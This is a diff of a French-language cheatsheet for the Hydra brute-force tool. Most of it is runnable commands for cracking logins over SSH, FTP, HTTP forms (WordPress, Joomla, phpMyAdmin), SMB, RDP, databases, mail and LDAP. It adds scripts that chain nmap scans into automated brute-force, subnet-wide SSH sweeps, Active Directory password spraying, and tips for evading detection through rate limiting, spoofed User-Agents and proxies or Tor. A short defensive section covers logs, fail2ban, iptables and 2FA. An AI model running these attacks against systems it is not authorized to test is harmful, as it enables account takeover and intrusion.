@@ -1,122 +1,759 @@
-# 🐍 Hydra - Cheatsheet CyberSécurité
+# 💧 Hydra - Cheatsheet Cyber Sécurité
 
-Hydra est un outil puissant de **bruteforce** multi-protocoles : HTTP, FTP, SSH, RDP, SMB, VNC, MySQL, etc.
-
----
-
-## ⚙️ 1. Syntaxe de base
-
-hydra -l <utilisateur> -P <wordlist.txt> <ip> <service>  
-> Bruteforce avec un seul utilisateur
-
-hydra -L <users.txt> -P <wordlist.txt> <ip> <service>  
-> Bruteforce multi-utilisateur
-
-hydra -V -l admin -P rockyou.txt <ip> ftp  
-> Mode verbeux (-V) sur FTP
+Guide orienté **brute-force de services réseau** et **cracking de credentials** avec Hydra (THC-Hydra). Focus sur l'exploitation et l'authentification.
 
 ---
 
-## 🌐 2. HTTP / Web login
+## 📖 Qu'est-ce que Hydra ?
 
-hydra -l admin -P wordlist.txt <ip> http-get /admin  
-> Bruteforce HTTP GET simple
+**Hydra** est un cracker de login réseau ultra-rapide supportant de nombreux protocoles.
 
-hydra -L users.txt -P pass.txt <ip> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Login failed"  
-> Bruteforce POST avec formulaire personnalisé
+**Capacités** :
+- 50+ protocoles supportés
+- Multi-threading
+- Brute-force parallèle
+- Support proxy (SOCKS4/5, HTTP)
+- Mode restore
+- Format de sortie personnalisable
 
-hydra -L users.txt -P pass.txt <ip> http-form-post "/login.php:user=^USER^&pass=^PASS^:S=Welcome"  
-> Variante avec string de succès (S=)
-
----
-
-## 🔐 3. SSH
-
-hydra -l root -P rockyou.txt ssh://<ip>  
-> Bruteforce SSH (port 22)
-
-hydra -L users.txt -P pass.txt ssh://<ip> -t 4  
-> SSH avec threads (-t)
+**Protocoles** : SSH, FTP, HTTP, HTTPS, SMB, RDP, MySQL, PostgreSQL, SMTP, POP3, IMAP, VNC, et bien d'autres
 
 ---
 
-## 📁 4. FTP
+## 1️⃣ Syntaxe de Base
 
-hydra -l anonymous -P /dev/null ftp://<ip>  
-> Test login FTP anonyme
+### Structure générale
 
-hydra -L users.txt -P rockyou.txt ftp://<ip>  
-> Bruteforce complet FTP
+```bash
+hydra [options] [target] [protocole]
 
----
+# Exemple basique
+hydra -l admin -p password 192.168.1.100 ssh
+```
 
-## 🪟 5. SMB / Windows
+### Options principales
 
-hydra -L users.txt -P pass.txt smb://<ip>  
-> Bruteforce d’accès SMB
+```bash
+# Utilisateur
+-l username         # Username unique
+-L userlist.txt     # Liste d'usernames
 
----
+# Mot de passe
+-p password         # Password unique
+-P passlist.txt     # Liste de passwords
 
-## 🧠 6. MySQL / PostgreSQL / MSSQL
+# Combinaison
+-C credlist.txt     # Format user:pass
 
-hydra -L users.txt -P pass.txt mysql://<ip>  
-> MySQL bruteforce
+# Cible
+-s PORT             # Port custom
+-t THREADS          # Nombre de threads (défaut 16)
+-w TIMEOUT          # Timeout
 
-hydra -L users.txt -P pass.txt postgres://<ip>  
-> PostgreSQL
-
-hydra -L users.txt -P pass.txt mssql://<ip>  
-> Microsoft SQL Server
-
----
-
-## 🖥️ 7. RDP (Remote Desktop)
-
-hydra -L users.txt -P pass.txt rdp://<ip>  
-> RDP bruteforce
-
----
-
-## 🎛️ 8. Options utiles
-
--t 4  
-> Threads parallèles (accélère les tests)
-
--vV  
-> Verbosité : chaque tentative est affichée
-
--s PORT  
-> Spécifie un port non standard
-
--f  
-> Arrête à la première réussite
-
--o result.txt  
-> Sauvegarde des résultats
+# Output
+-o file.txt         # Sauvegarder résultats
+-b FORMAT           # Format (text, json, jsonv1)
+-v / -V             # Verbose
+```
 
 ---
 
-## 🧪 9. Exemples avancés
+## 2️⃣ SSH Brute-force
 
-hydra -l admin -P rockyou.txt <ip> http-post-form "/admin.php:username=^USER^&password=^PASS^:F=Invalid login"  
-> Bruteforce POST avec détection de l’échec
+### Attaque basique
 
-hydra -L users.txt -P pass.txt -s 2222 ssh://<ip>  
-> SSH sur port personnalisé
+```bash
+# Username + password unique
+hydra -l admin -p password123 192.168.1.100 ssh
+
+# Liste users + liste passwords
+hydra -L users.txt -P passwords.txt 192.168.1.100 ssh
+
+# Un user + liste passwords
+hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh
+
+# Liste users + un password
+hydra -L users.txt -p Admin123! 192.168.1.100 ssh
+```
+
+### Options SSH
+
+```bash
+# Port custom
+hydra -l admin -P passwords.txt -s 2222 192.168.1.100 ssh
+
+# Avec threads
+hydra -l admin -P passwords.txt -t 4 192.168.1.100 ssh
+
+# Avec output
+hydra -l admin -P passwords.txt 192.168.1.100 ssh -o ssh_cracked.txt
+
+# Stop après premier succès
+hydra -l admin -P passwords.txt -f 192.168.1.100 ssh
+```
 
 ---
 
-## 🛑 10. Défense & détection
+## 3️⃣ FTP Brute-force
 
-- Les logs des services (auth.log, web logs) gardent une trace → utilisez Tor, proxychains.
-- Ne pas abuser sur des cibles non autorisées.
-- Privilégiez l'audit légal et les environnements lab.
+### Attaque FTP
+
+```bash
+# Basique
+hydra -l admin -P passwords.txt 192.168.1.100 ftp
+
+# Avec threads
+hydra -l ftp -P passwords.txt -t 16 192.168.1.100 ftp
+
+# Multiple users
+hydra -L users.txt -P passwords.txt 192.168.1.100 ftp
+
+# Anonymous FTP test
+hydra -l anonymous -p "" 192.168.1.100 ftp
+```
 
 ---
 
-## 📚 11. Ressources
+## 4️⃣ HTTP/HTTPS Brute-force
 
-- [Hydra GitHub (thc-hydra)](https://github.com/vanhauser-thc/thc-hydra)
-- [PayloadsAllTheThings - Brute Force](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Brute%20Force)
-- [SecLists - Wordlists](https://github.com/danielmiessler/SecLists)
+### HTTP Form-based (POST)
 
+```bash
+# Login form HTTP POST
+hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
+
+# Avec cookies
+hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:H=Cookie: security=low:F=incorrect"
+
+# HTTPS
+hydra -l admin -P passwords.txt 192.168.1.100 https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"
+```
+
+**Format** :
+```
+"/path:params:condition"
+
+params : username=^USER^&password=^PASS^
+^USER^ : Remplacé par username
+^PASS^ : Remplacé par password
+
+condition :
+F=string  : Failure condition (si string présent = échec)
+S=string  : Success condition (si string présent = succès)
+```
+
+### HTTP GET
+
+```bash
+# HTTP GET avec params
+hydra -l admin -P passwords.txt 192.168.1.100 http-get-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
+
+# HTTP Basic Auth
+hydra -l admin -P passwords.txt 192.168.1.100 http-get /admin
+
+# HTTPS Basic Auth
+hydra -l admin -P passwords.txt 192.168.1.100 https-get /admin
+```
+
+### Exemples pratiques
+
+**WordPress**
+```bash
+hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect"
+```
+
+**Joomla**
+```bash
+hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/administrator/index.php:username=^USER^&passwd=^PASS^:F=incorrect"
+```
+
+**phpMyAdmin**
+```bash
+hydra -l root -P passwords.txt 192.168.1.100 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^:F=denied"
+```
+
+---
+
+## 5️⃣ SMB Brute-force
+
+### Attaque SMB
+
+```bash
+# SMB (port 445)
+hydra -l administrator -P passwords.txt 192.168.1.100 smb
+
+# Avec domaine
+hydra -l administrator -P passwords.txt 192.168.1.100 smb://DOMAIN
+
+# Liste users
+hydra -L users.txt -P passwords.txt 192.168.1.100 smb
+
+# Stop après succès
+hydra -l admin -P passwords.txt -f 192.168.1.100 smb
+```
+
+---
+
+## 6️⃣ RDP Brute-force
+
+### Attaque RDP
+
+```bash
+# RDP (port 3389)
+hydra -l administrator -P passwords.txt 192.168.1.100 rdp
+
+# Avec domaine
+hydra -l administrator -P passwords.txt rdp://192.168.1.100/DOMAIN
+
+# Threads limités (RDP est sensible)
+hydra -l administrator -P passwords.txt -t 4 192.168.1.100 rdp
+```
+
+---
+
+## 7️⃣ Base de Données
+
+### MySQL
+
+```bash
+# MySQL (port 3306)
+hydra -l root -P passwords.txt 192.168.1.100 mysql
+
+# Port custom
+hydra -l root -P passwords.txt -s 3307 192.168.1.100 mysql
+
+# Multiple users
+hydra -L users.txt -P passwords.txt 192.168.1.100 mysql
+```
+
+### PostgreSQL
+
+```bash
+# PostgreSQL (port 5432)
+hydra -l postgres -P passwords.txt 192.168.1.100 postgres
+
+# Avec database
+hydra -l postgres -P passwords.txt 192.168.1.100 postgres://template1
+```
+
+### MSSQL
+
+```bash
+# MSSQL (port 1433)
+hydra -l sa -P passwords.txt 192.168.1.100 mssql
+
+# Avec domaine
+hydra -l sa -P passwords.txt mssql://192.168.1.100/DOMAIN
+```
+
+### MongoDB
+
+```bash
+# MongoDB (port 27017)
+hydra -l admin -P passwords.txt 192.168.1.100 mongodb
+
+# Sans auth (test)
+hydra -l "" -p "" 192.168.1.100 mongodb
+```
+
+---
+
+## 8️⃣ Email Services
+
+### SMTP
+
+```bash
+# SMTP (port 25/587)
+hydra -l user@domain.com -P passwords.txt 192.168.1.100 smtp
+
+# SMTP avec TLS
+hydra -l user@domain.com -P passwords.txt smtp://192.168.1.100:587
+
+# SMTP AUTH
+hydra -l user@domain.com -P passwords.txt -s 587 192.168.1.100 smtp
+```
+
+### POP3
+
+```bash
+# POP3 (port 110)
+hydra -l user@domain.com -P passwords.txt 192.168.1.100 pop3
+
+# POP3S (port 995)
+hydra -l user@domain.com -P passwords.txt pop3s://192.168.1.100
+```
+
+### IMAP
+
+```bash
+# IMAP (port 143)
+hydra -l user@domain.com -P passwords.txt 192.168.1.100 imap
+
+# IMAPS (port 993)
+hydra -l user@domain.com -P passwords.txt imaps://192.168.1.100
+```
+
+---
+
+## 9️⃣ Autres Protocoles
+
+### VNC
+
+```bash
+# VNC (port 5900)
+hydra -P passwords.txt 192.168.1.100 vnc
+
+# VNC n'a pas d'username, seulement password
+```
+
+### Telnet
+
+```bash
+# Telnet (port 23)
+hydra -l admin -P passwords.txt 192.168.1.100 telnet
+
+# Threads limités
+hydra -l admin -P passwords.txt -t 1 192.168.1.100 telnet
+```
+
+### SNMP
+
+```bash
+# SNMP (port 161)
+hydra -P community_strings.txt 192.168.1.100 snmp
+
+# Versions SNMP
+hydra -P strings.txt snmp://192.168.1.100/v1
+hydra -P strings.txt snmp://192.168.1.100/v2c
+```
+
+### LDAP
+
+```bash
+# LDAP (port 389)
+hydra -l cn=admin,dc=example,dc=com -P passwords.txt 192.168.1.100 ldap
+
+# LDAPS (port 636)
+hydra -l cn=admin,dc=example,dc=com -P passwords.txt ldaps://192.168.1.100
+```
+
+---
+
+## 🔟 Options Avancées
+
+### Restoration et sessions
+
+```bash
+# Sauvegarder session
+hydra -l admin -P huge_list.txt 192.168.1.100 ssh -o results.txt
+
+# Restaurer session interrompue
+hydra -R
+
+# Le fichier .restore est créé automatiquement
+```
+
+### Proxy
+
+```bash
+# Via HTTP proxy
+hydra -l admin -P passwords.txt -o results.txt -I -w 30 -t 1 192.168.1.100 http-proxy://proxy.com:8080
+
+# Via SOCKS4/5
+hydra -l admin -P passwords.txt -e nsr 192.168.1.100 ssh -m "/run/tor/socks"
+```
+
+### Mode verbose
+
+```bash
+# Verbose léger
+hydra -l admin -P passwords.txt -v 192.168.1.100 ssh
+
+# Verbose complet
+hydra -l admin -P passwords.txt -V 192.168.1.100 ssh
+
+# Debug
+hydra -l admin -P passwords.txt -d 192.168.1.100 ssh
+```
+
+### Génération de passwords
+
+```bash
+# Empty password
+hydra -l admin -e n 192.168.1.100 ssh  # null password
+
+# Same as login
+hydra -l admin -e s 192.168.1.100 ssh  # admin/admin
+
+# Reverse login
+hydra -l admin -e r 192.168.1.100 ssh  # admin/nimda
+
+# Combiné
+hydra -l admin -e nsr -P passwords.txt 192.168.1.100 ssh
+```
+
+---
+
+## 1️⃣1️⃣ Wordlists et Optimisation
+
+### Créer wordlists ciblées
+
+```bash
+# Users courants
+cat > users.txt << EOF
+admin
+administrator
+root
+user
+guest
+test
+EOF
+
+# Passwords courants
+cat > passwords.txt << EOF
+admin
+password
+123456
+admin123
+Password1
+letmein
+welcome
+EOF
+```
+
+### Combiner wordlists
+
+```bash
+# Avec crunch
+crunch 8 8 -t Admin@@@ > passwords.txt
+
+# Pattern: AdminXXX où XXX = 000-999
+```
+
+### Optimisation threads
+
+```bash
+# SSH : -t 4 (max recommandé)
+hydra -l admin -P passwords.txt -t 4 192.168.1.100 ssh
+
+# HTTP : -t 10-16
+hydra -l admin -P passwords.txt -t 16 192.168.1.100 http-post-form
+
+# FTP : -t 16
+hydra -l admin -P passwords.txt -t 16 192.168.1.100 ftp
+
+# RDP : -t 1-4 (très limité)
+hydra -l admin -P passwords.txt -t 1 192.168.1.100 rdp
+```
+
+---
+
+## 1️⃣2️⃣ Scripts d'Automatisation
+
+### Script multi-protocoles
+
+```bash
+#!/bin/bash
+# hydra-auto.sh
+
+TARGET=$1
+USER=$2
+PASSLIST=$3
+
+echo "[+] Starting brute-force on $TARGET"
+
+# SSH
+echo "[*] Testing SSH..."
+hydra -l $USER -P $PASSLIST -t 4 $TARGET ssh -o ssh_results.txt
+
+# FTP
+echo "[*] Testing FTP..."
+hydra -l $USER -P $PASSLIST $TARGET ftp -o ftp_results.txt
+
+# SMB
+echo "[*] Testing SMB..."
+hydra -l $USER -P $PASSLIST $TARGET smb -o smb_results.txt
+
+# MySQL
+echo "[*] Testing MySQL..."
+hydra -l $USER -P $PASSLIST $TARGET mysql -o mysql_results.txt
+
+echo "[+] Brute-force complete! Check *_results.txt"
+```
+
+**Usage** :
+```bash
+chmod +x hydra-auto.sh
+./hydra-auto.sh 192.168.1.100 admin passwords.txt
+```
+
+### Script de scan + brute-force
+
+```bash
+#!/bin/bash
+# scan-and-bruteforce.sh
+
+TARGET=$1
+
+# Scan Nmap
+echo "[*] Scanning ports..."
+nmap -sV -p 21,22,23,80,443,3306,3389,5432 $TARGET -oG scan.txt
+
+# Parser les services ouverts
+while read line; do
+    if echo "$line" | grep -q "open"; then
+        PORT=$(echo "$line" | grep -oP '\d+/open' | cut -d/ -f1)
+        SERVICE=$(echo "$line" | grep -oP '\d+/open/tcp//\K\w+')
+        
+        echo "[+] Found $SERVICE on port $PORT"
+        
+        case $SERVICE in
+            ssh)
+                hydra -l root -P passwords.txt -s $PORT $TARGET ssh
+                ;;
+            ftp)
+                hydra -l ftp -P passwords.txt -s $PORT $TARGET ftp
+                ;;
+            mysql)
+                hydra -l root -P passwords.txt -s $PORT $TARGET mysql
+                ;;
+        esac
+    fi
+done < scan.txt
+```
+
+---
+
+## 1️⃣3️⃣ Évasion et Discrétion
+
+### Rate limiting
+
+```bash
+# Limiter requêtes par seconde
+hydra -l admin -P passwords.txt -t 1 -w 5 192.168.1.100 ssh
+
+# -w 5 : 5 secondes entre chaque tentative
+```
+
+### User-Agent custom
+
+```bash
+# HTTP avec User-Agent
+hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect:H=User-Agent: Mozilla/5.0"
+```
+
+### Via proxy
+
+```bash
+# Via proxy pour masquer IP
+hydra -l admin -P passwords.txt 192.168.1.100 ssh -s 22 -o results.txt -I http-proxy://proxy:8080
+```
+
+---
+
+## 1️⃣4️⃣ Cas Pratiques
+
+### Scénario 1 : Pentest interne
+
+```bash
+# 1. Scan du réseau
+nmap -sV 192.168.1.0/24 -oG network_scan.txt
+
+# 2. Identifier services
+grep "open" network_scan.txt
+
+# 3. Brute-force SSH sur toutes les machines
+cat network_scan.txt | grep "22/open" | cut -f2 | while read ip; do
+    echo "[*] Testing $ip"
+    hydra -l admin -P common_passwords.txt $ip ssh -o ssh_${ip}.txt
+done
+
+# 4. Analyser résultats
+cat ssh_*.txt | grep "login:"
+```
+
+### Scénario 2 : Web application
+
+```bash
+# 1. Identifier page de login
+curl -I http://target.com/login
+
+# 2. Analyser formulaire
+curl http://target.com/login | grep "form"
+
+# 3. Tester credentials par défaut
+hydra -l admin -p admin http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" target.com
+
+# 4. Si échec, liste passwords
+hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" target.com
+
+# 5. Vérifier résultats
+hydra -l admin -P passwords.txt target.com http-post-form "..." -o web_cracked.txt
+cat web_cracked.txt
+```
+
+### Scénario 3 : Active Directory
+
+```bash
+# 1. Énumérer users (via LDAP, SMB, etc.)
+enum4linux 192.168.1.100 | grep "user:" > users.txt
+
+# 2. Password spraying (même password pour tous)
+hydra -L users.txt -p Summer2023! 192.168.1.100 smb
+
+# 3. Brute-force admin
+hydra -l administrator -P passwords.txt 192.168.1.100 smb
+
+# 4. RDP si succès SMB
+hydra -l administrator -p FoundPassword123! 192.168.1.100 rdp
+```
+
+---
+
+## 1️⃣5️⃣ Détection et Contre-Mesures
+
+### Détecter les attaques
+
+**Logs à surveiller** :
+```bash
+# SSH
+/var/log/auth.log
+grep "Failed password" /var/log/auth.log
+
+# FTP
+/var/log/vsftpd.log
+
+# Apache/Nginx
+/var/log/apache2/access.log
+grep "POST /login" /var/log/apache2/access.log
+```
+
+**Fail2ban** :
+```bash
+# Bannir après X tentatives
+apt install fail2ban
+systemctl enable fail2ban
+```
+
+### Protection
+
+**Rate limiting** :
+```bash
+# iptables
+iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set
+iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 4 -j DROP
+```
+
+**MFA/2FA** :
+```bash
+# Activer 2FA sur SSH
+# Google Authenticator PAM module
+apt install libpam-google-authenticator
+```
+
+**Comptes monitoring** :
+```bash
+# Honeypot accounts
+# Créer comptes "admin", "test" qui alertent
+```
+
+---
+
+## 1️⃣6️⃣ Cheatsheet Rapide
+
+### Commandes essentielles
+
+```bash
+# SSH
+hydra -l USER -P PASS_LIST IP ssh
+
+# FTP
+hydra -l USER -P PASS_LIST IP ftp
+
+# HTTP POST
+hydra -l USER -P PASS_LIST IP http-post-form "/path:user=^USER^&pass=^PASS^:F=fail"
+
+# SMB
+hydra -l USER -P PASS_LIST IP smb
+
+# RDP
+hydra -l USER -P PASS_LIST IP rdp
+
+# MySQL
+hydra -l USER -P PASS_LIST IP mysql
+
+# Avec output
+hydra -l USER -P PASS_LIST IP SERVICE -o output.txt
+
+# Threads
+hydra -l USER -P PASS_LIST -t 16 IP SERVICE
+
+# Stop après succès
+hydra -l USER -P PASS_LIST -f IP SERVICE
+
+# Verbose
+hydra -l USER -P PASS_LIST -V IP SERVICE
+
+# Restore
+hydra -R
+```
+
+### Options importantes
+
+```
+-l USER      : Username
+-L FILE      : User list
+-p PASS      : Password
+-P FILE      : Password list
+-C FILE      : Combo list (user:pass)
+-s PORT      : Port
+-t THREADS   : Threads (défaut 16)
+-f           : Stop après succès
+-V           : Verbose
+-o FILE      : Output
+-R           : Restore session
+-e nsr       : n=null, s=same, r=reverse
+```
+
+---
+
+## 1️⃣7️⃣ Ressources
+
+### Documentation
+- GitHub : https://github.com/vanhauser-thc/thc-hydra
+- Man page : `man hydra`
+
+### Wordlists
+- RockYou : `/usr/share/wordlists/rockyou.txt`
+- SecLists : `/usr/share/seclists/Passwords/`
+- Common passwords : https://github.com/danielmiessler/SecLists
+
+### Outils complémentaires
+- Medusa : Alternative à Hydra
+- Ncrack : Cracker réseau
+- Patator : Python-based
+- Crowbar : Brute-force RDP
+
+### Labs
+- TryHackMe : Hydra rooms
+- HackTheBox : Login bruteforce
+- VulnHub : Authentication challenges
+
+---
+
+## 💡 Tips Pro
+
+1. **Toujours limiter threads** selon le protocole
+2. **SSH = max 4 threads** (éviter ban)
+3. **RDP = 1 thread** (très sensible)
+4. **Stop après succès** : -f option
+5. **Wordlists ciblées** > longues listes
+6. **Password spraying** efficace contre AD
+7. **Restoration** : Hydra sauve automatiquement
+8. **Verbose -V** pour debugging
+9. **Rate limiting** pour discrétion (-w option)
+10. **Combiner avec enum** pour users valides
+
+---
+
+**💧 Hydra est l'outil de brute-force réseau le plus rapide. Support de 50+ protocoles pour casser toute authentification !**
